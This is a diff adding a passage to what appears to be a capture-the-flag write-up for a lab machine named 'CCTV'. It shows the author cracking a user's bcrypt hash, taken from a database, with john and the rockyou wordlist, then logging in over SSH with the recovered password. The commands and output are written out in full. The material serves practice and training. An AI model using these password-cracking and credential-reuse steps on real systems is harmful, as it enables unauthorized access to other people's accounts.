@@ -105,3 +105,71 @@ Table: Users
 +------------+--------------------------------------------------------------+
 ```
 
+There's 2 accounts here both that contain a bcrypt password hash being extracted. The `$2y$10$` prefix tells you it's bcrypt with cost factor 10. We can take both of these hashes and attempt to crack them with `john` but we can assume the superadmin password is unlikely to be cracked so we can attempt the user `mark` first.
+
+```
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
+└─# echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > markhash.txt
+                                                                          
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
+└─# cat markhash.txt
+$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
+                                                                          
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
+└─# john markhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+
+PASSWORD_WILL_BE_HERE      
+
+1g 0:00:00:34 DONE (2026-05-17 21:53) 0.02884g/s 172.3p/s 172.3c/s 172.3C/s precioso..tuyyo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Success. With the user password we can attempt ssh authorization onto the backend machine.
+
+```
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
+└─# ssh mark@10.129.61.151
+mark@10.129.61.151's password: 
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sun 17 May 13:06:04 UTC 2026
+
+  System load:           0.03
+  Usage of /:            72.0% of 8.70GB
+  Memory usage:          30%
+  Swap usage:            0%
+  Processes:             256
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.61.151
+  IPv6 address for eth0: dead:beef::a0de:adff:fe72:96c
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+14 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sun May 17 12:57:01 2026 from 10.10.16.212
+mark@cctv:~$
+```
